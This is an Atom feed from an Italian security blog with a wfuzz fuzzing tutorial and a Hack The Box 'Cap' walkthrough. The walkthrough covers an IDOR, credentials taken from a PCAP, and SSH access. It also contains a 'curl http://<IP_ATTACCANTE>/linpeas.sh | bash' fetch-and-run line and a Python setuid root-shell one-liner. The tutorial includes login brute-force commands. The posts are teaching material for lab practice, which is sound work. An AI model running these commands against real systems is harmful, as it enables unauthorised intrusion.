@@ -1,0 +1,115 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
+    <title>Cybergate Lab</title>
+    <link href="https://3nc0d3d.github.io/cybergatelab/feed.xml" rel="self" />
+    <link href="https://3nc0d3d.github.io/cybergatelab" />
+    <updated>2025-02-15T17:25:32+01:00</updated>
+    <author>
+        <name>Alessandro</name>
+    </author>
+    <id>https://3nc0d3d.github.io/cybergatelab</id>
+
+    <entry>
+        <title>Wfuzz: L’arma Segreta per il Fuzzing di Applicazioni Web</title>
+        <author>
+            <name>Alessandro</name>
+        </author>
+        <link href="https://3nc0d3d.github.io/cybergatelab/wfuzz-larma-segreta-per-il-fuzzing-di-applicazioni-web.html"/>
+        <id>https://3nc0d3d.github.io/cybergatelab/wfuzz-larma-segreta-per-il-fuzzing-di-applicazioni-web.html</id>
+
+        <updated>2025-02-15T17:24:55+01:00</updated>
+            <summary>
+                <![CDATA[
+                    Nel mondo della sicurezza informatica, la capacità di testare e mettere alla prova le applicazioni web è fondamentale. Tra gli strumenti più potenti e versatili a disposizione dei professionisti della sicurezza, spicca wfuzz. Ma cos’è esattamente wfuzz e come può essere utilizzato per migliorare la&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                
+  <p>
+    Nel mondo della sicurezza informatica, la capacità di testare e mettere alla prova le applicazioni web è fondamentale. Tra gli strumenti più potenti e versatili a disposizione dei professionisti della sicurezza, spicca wfuzz. Ma cos’è esattamente wfuzz e come può essere utilizzato per migliorare la sicurezza delle nostre applicazioni web?<br><br>In questo articolo, esploreremo in dettaglio wfuzz, un fuzzer a riga di comando che va ben oltre il semplice directory brute-forcing. Scopriremo come può essere impiegato per una vasta gamma di test di sicurezza, dalla scoperta di aree nascoste all’identificazione di vulnerabilità complesse.<br><br>Cos’è il Fuzzing?<br><br>Prima di immergerci in wfuzz, è utile capire cos’è il “fuzzing”. In termini semplici, il fuzzing è una tecnica di test che consiste nell’inviare un gran numero di input inattesi, casuali o malformati ad un sistema (in questo caso, un’applicazione web) per osservare come reagisce. L’obiettivo è individuare comportamenti anomali, errori o crash che potrebbero indicare vulnerabilità di sicurezza.<br><br>Nel contesto delle applicazioni web, il fuzzing può essere applicato a diverse aree:<br><br>URL: Provare a indovinare directory e file non pubblicamente accessibili.<br>Parametri (GET e POST): Inviare input inaspettati nei parametri per testare vulnerabilità come SQL Injection o XSS.<br>Header HTTP: Modificare gli header per scoprire funzionalità nascoste o vulnerabilità legate alla gestione degli header.<br>Form di autenticazione: Tentare brute-force su credenziali di accesso.<br>Wfuzz: Il Fuzzer Web Versatile e Potente<br><br>wfuzz è uno strumento a riga di comando che eccelle proprio in queste attività di fuzzing. È molto più flessibile e potente di strumenti più specifici come gobuster, offrendo un controllo granulare su ogni aspetto delle richieste HTTP e sull’analisi delle risposte.<br><br>Funzionalità Chiave di Wfuzz:<br><br>Fuzzing di URL: Simile al directory brute-forcing, ma con maggiore flessibilità. Permette di sostituire parti dell’URL con parole da una wordlist per scoprire risorse nascoste.<br>Fuzzing di Parametri GET e POST: Permette di inserire payload da wordlist nei parametri delle richieste GET e POST, ideale per testare vulnerabilità di injection e manipolazione dei dati.<br>Fuzzing di Header HTTP: Consente di modificare e fuzzare vari header HTTP, aprendo la strada a test più avanzati e alla scoperta di configurazioni inattese.<br>Brute-forcing di Autenticazione: Può essere utilizzato per tentare attacchi brute-force su form di login, sia Basic Authentication che form basati su password.<br>Customizzazione Totale delle Richieste: Offre un controllo completo sulla creazione delle richieste HTTP, inclusi metodi, header, body, cookie, permettendo test molto mirati.<br>Filtraggio Avanzato dei Risultati: Fornisce opzioni di filtraggio potenti basate su codici di stato, dimensioni della risposta, contenuto, regex, per concentrarsi sui risultati più rilevanti e ridurre il “rumore”.<br>Estensibilità con Plugin: È possibile estendere wfuzz con plugin per adattarlo a scenari di test specifici o aggiungere nuove funzionalità.<br>Output in Diversi Formati: Permette di salvare i risultati in formati come HTML, CSV, JSON e Raw, facilitando l’analisi e la reportistica.<br>Installare Wfuzz su Debian (e Sistemi Simili)<br><br>Se utilizzi Debian o una distribuzione basata su Debian (come Ubuntu), l’installazione di wfuzz è semplicissima:<br><br>sudo apt update<br>sudo apt install wfuzz<br>Dopo l’installazione, wfuzz sarà disponibile come comando wfuzz nel tuo terminale.<br><br>Utilizzo Base di Wfuzz: Esempi Pratici<br><br>Il cuore di ogni comando wfuzz è la parola chiave FUZZ. È questo segnaposto che wfuzz sostituirà con le parole dalla wordlist che specificherai.<br><br>Vediamo alcuni esempi di utilizzo comune:<br><br>1. Directory Brute-Forcing (Esplorazione di Directory Nascoste):<br><br>Per eseguire un directory brute-forcing, puoi usare questo comando:<br><br>wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://www.example.com/FUZZ<br>-c: Attiva l’output colorato per una migliore leggibilità.<br>-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt: Specifica la wordlist di directory da utilizzare (wordlist comuni sono spesso in /usr/share/wordlists).<br>http://www.example.com/FUZZ: L’URL target. FUZZ indica a wfuzz di sostituire “FUZZ” con ogni parola della wordlist.<br>2. Fuzzing di Parametri GET (Test di Input e Vulnerabilità):<br><br>Per fuzzare il parametro query in un URL GET, puoi usare:<br><br>wfuzz -c -w wordlist.txt "http://www.example.com/search.php?query=FUZZ"<br>wfuzz invierà richieste come http://www.example.com/search.php?query=parola1, http://www.example.com/search.php?query=parola2, e così via, usando le parole dalla wordlist.txt.<br><br>3. Fuzzing di Parametri POST (Simulazione di Form):<br><br>Per fuzzare il parametro username in una richiesta POST ad un form di login:<br><br>wfuzz -c -w usernames.txt -d "username=FUZZ&amp;password=password123" -H "Content-Type: application/x-www-form-urlencoded" http://www.example.com/login.php<br>-d “username=FUZZ&amp;password=password123”: Definisce i dati POST. FUZZ sarà sostituito con ogni username dalla usernames.txt, mentre password rimane fissa.<br>-H “Content-Type: application/x-www-form-urlencoded”: Imposta l’header corretto per i dati POST di un form HTML.<br>4. Fuzzing di Header HTTP (Test di User-Agent):<br><br>Per testare come il server reagisce a diversi User-Agent:<br><br>wfuzz -c -w user-agents.txt -H "User-Agent: FUZZ" http://www.example.com<br>5. Filtraggio dei Risultati (Concentrarsi sull’Importante):<br><br>Per nascondere i risultati con codici di stato 404 e 302, puoi usare –hc:<br><br>wfuzz -c -w wordlist.txt --hc 404,302 http://www.example.com/FUZZ<br>Solo i risultati con codici di stato diversi da 404 e 302 saranno visualizzati, riducendo il rumore.<br><br>6. Salvare l’Output su Disco (Analisi Successiva):<br><br>Per salvare i risultati in formato HTML nel file risultati_directory.html:<br><br>wfuzz -c -w wordlist.txt -o html,risultati_directory.html http://www.example.com/FUZZ<br>Puoi sostituire html con csv, json o raw per altri formati di output.<br><br>Considerazioni Fondamentali per un Utilizzo Responsabile:<br><br>Etica e Legalità: Utilizza wfuzz solo su siti web di cui hai il permesso di testare la sicurezza. Le scansioni non autorizzate sono illegali e non etiche.<br>Impatto sul Server: Il fuzzing intensivo può sovraccaricare i server. Utilizza wfuzz con responsabilità, limitando i thread (-t) e usando ritardi (–delay) se necessario.<br>Qualità della Wordlist: L’efficacia di wfuzz dipende fortemente dalla wordlist. Scegli wordlist appropriate per il tipo di test.<br>Conclusione: Wfuzz, Uno Strumento Indispensabile<br><br>wfuzz è uno strumento potente e flessibile per il fuzzing di applicazioni web. La sua versatilità, le opzioni di customizzazione e filtraggio, e la capacità di salvare l’output lo rendono un componente essenziale per chiunque si occupi di sicurezza informatica e desideri testare a fondo la robustezza delle applicazioni web.<br><br>Inizia a sperimentare con gli esempi base, esplora la vasta gamma di opzioni di wfuzz (consulta wfuzz –help per la guida completa) e scopri come questo strumento può aiutarti a migliorare la sicurezza delle tue applicazioni web!
+  </p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>Exploit della Macchina Cap di HTB</title>
+        <author>
+            <name>Alessandro</name>
+        </author>
+        <link href="https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html"/>
+        <id>https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html</id>
+
+        <updated>2025-02-15T17:22:18+01:00</updated>
+            <summary>
+                <![CDATA[
+                    Introduzione Cap è una macchina Linux a bassa difficoltà progettata per test di sicurezza. Al suo interno è presente un server HTTP dedicato ad attività amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilità IDOR (Insecure Direct Object&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h1 id="introduzione">Introduzione</h1>
+<p>Cap è una macchina Linux a bassa difficoltà progettata per test di sicurezza. Al suo interno è presente un server HTTP dedicato ad attività amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilità <strong>IDOR</strong> (Insecure Direct Object Reference) abbia permesso di accedere a dati sensibili e di ottenere privilegi root tramite escalation.</p><h1 id="cosè-lidor">Cos’è l’IDOR?</h1>
+<p>L’IDOR è una <em>vulnerabilità che si verifica quando un’applicazione espone riferimenti diretti a oggetti interni (es. ID di record, file) senza controllare i permessi dell’utente</em>. Ciò consente a un attaccante di manipolare tali riferimenti per accedere a risorse non autorizzate.</p><p><strong>Esempio Pratico</strong>
+Supponiamo un URL come:</p><pre><code>http://esempio.com/documento/123
+</code></pre>
+<p>Se l’applicazione non verifica che l’utente abbia i diritti per accedere al documento con ID 123, modificando questo valore (es. 124) si potrebbe accedere a documenti altrui.</p><h2 id="rischi-associati">Rischi Associati</h2>
+<ul>
+<li>Esposizione di dati sensibili.</li>
+<li>Manipolazione di risorse critiche.</li>
+<li>Difficoltà di individuazione (bassa visibilità).</li>
+</ul>
+<h2 id="prevenzione">Prevenzione</h2>
+<ul>
+<li>Implementare controlli di accesso granulari.</li>
+<li>Utilizzare identificatori non prevedibili (es. UUID).</li>
+<li>Validare e sanificare gli input.</li>
+<li>Loggare le attività sospette.</li>
+<li>La Vulnerabilità nella Macchina Cap</li>
+<li>L’applicazione web di Cap permetteva il download di file PCAP (acquisizioni di traffico di rete) tramite URL come:</li>
+</ul>
+<pre><code>http://10.10.10.56/data/2
+</code></pre>
+<p>Modificando l’ID (2, 3, ecc.), era possibile scaricare PCAP appartenenti ad altri </p><p>utenti, sfruttando proprio un IDOR.</p><p>Fasi dell’Attacco</p><ol>
+<li>Scansione Iniziale
+Dopo aver configurato la VPN per accedere alla macchina, ho utilizzato nmap per identificare le porte aperte:</li>
+</ol>
+<p>nmap -sV 10.10.10.56
+Risultato:</p><p>Porta 21 (FTP), 22 (SSH), 80 (HTTP).
+2. Exploit dell’IDOR
+Modificando l’ID nell’URL (es. <a href="http://10.10.10.56/data/3">http://10.10.10.56/data/3</a>), ho scaricato diversi file PCAP.</p><ol start="3">
+<li>Analisi con Wireshark
+Uno dei file PCAP conteneva una connessione FTP non cifrata, con credenziali in chiaro:</li>
+</ol>
+<p>Copy</p><p>User: nathan<br>Password: Bu……F0RM3!
+4. Accesso SSH
+Le stesse credenziali erano valide per il servizio SSH:</p><p>ssh <a href="mailto:&#110;&#x61;&#x74;&#104;&#x61;&#x6e;&#x40;&#49;&#x30;&#46;&#49;&#x30;&#x2e;&#49;&#x30;&#x2e;&#53;&#x36;">&#110;&#x61;&#x74;&#104;&#x61;&#x6e;&#x40;&#49;&#x30;&#46;&#49;&#x30;&#x2e;&#49;&#x30;&#x2e;&#53;&#x36;</a>
+Privilege Escalation: Da Utente a Root</p><ol>
+<li>Ricerca di Vulnerabilità con linPEAS
+Cos’è linPEAS (linux Privilege Escalation Awesome Script) 
+Dopo aver ottenuto l’accesso come nathan, ho trasferito lo script linPEAS per individuare vettori di escalation:</li>
+</ol>
+<p>Avvio di un server HTTP in locale:
+bashCopypython -m http.server 80
+Esecuzione di linPEAS sul target:</p><p>bashCopycurl http://<IP_ATTACCANTE>/linpeas.sh | bash
+2. Individuazione del Vettore Critico
+Lo script ha evidenziato che l’eseguibile python3.8 possedeva il capability CAP_SETUID:</p><p>/usr/bin/python3.8 = cap_setuid+ep
+Questa capability consente a Python di modificare l’UID del processo, permettendo di impersonare root.</p><ol start="3">
+<li>Exploit Finale
+Per ottenere una shell root, ho eseguito:</li>
+</ol>
+<p>import os
+os.setuid(0)
+os.system(“/bin/bash”)
+Esecuzione:</p><p>python3.8 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’
+Risultato: Accesso come root! 🔑</p><p>Conclusioni
+La macchina Cap dimostra due rischi critici:</p><p>IDOR: L’assenza di controlli sugli ID ha permesso l’accesso a dati altrui.
+Capability Pericolose: Assegnare capability come CAP_SETUID a interpreti (es. Python) può portare a escalation catastrofiche.
+Best Practice</p><p>Limitare l’uso di capability ai soli processi necessari.
+Revisionare periodicamente i permessi dei file.
+Adottare il principio del minimo privilegio.
+Questo caso sottolinea l’importanza di un’igiene di sicurezza rigorosa, sia nel codice che nella configurazione di sistema.</p>
+            ]]>
+        </content>
+    </entry>
+</feed>
